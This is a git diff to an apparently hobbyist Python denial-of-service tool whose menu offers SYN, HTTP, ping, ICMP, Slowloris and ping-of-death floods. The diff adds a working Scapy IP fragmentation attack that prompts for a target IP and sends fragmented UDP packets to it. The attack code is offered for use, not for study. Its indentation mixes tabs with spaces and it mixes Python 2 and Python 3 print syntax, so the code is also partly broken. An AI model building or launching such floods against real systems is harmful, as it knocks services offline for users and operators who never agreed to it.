@@ -93,17 +93,18 @@ def main():
     print("Github: https://github.com/ParzivalHack")
     print("      [Menu]      ")
     print("1) SYN Flood Attack (Doesn't work on Termux)")
-    print("2) HTTP Flood Attack (Work in progress)")
+    print("2) HTTP Flood Attack")
     print("3) Slowloris Ping Attack")
     print("4) Ping Flood Attack")
     print("5) Ping of Death Attack (Doesn't work on Termux)")
     print("6) ICMP Flood Attack (Doesn't work on Termux)")
+    print("7) IP Fragmentation Attack")
     option = int(input("Choose an option: "))
     print(option)
     if option == 1:
         os.system("clear")
         print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
-        print("because of sockets permissions.")   
+        print("because of socket permissions.")   
         time.sleep(5)
         os.system("clear")
         print("  ______    ____       _____")
@@ -158,6 +159,9 @@ def main():
         print("/_/     /_____/\____/____/  ")
         Pingofdeath()
     elif option == 6:
+	print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
+        print("because of socket permissions.")   
+        time.sleep(5)
         os.system("clear")
         print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
@@ -165,5 +169,25 @@ def main():
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
         Icmpflood()
+    elif option == 7:
+        os.system("clear")
+        print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+	dip=str(input("Target IP: "))
+        payload="A"*496+"B"*500
+	packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
+
+        frags=fragment(packet,fragsize=500)
+
+        counter=1
+	for fragment in frags:
+		print("Packet Number: "+str(counter))
+		print "==================================================="
+		fragment.show() #displays each fragment
+		counter+=1
+		send(fragment)
 if __name__ == "__main__":
     main()
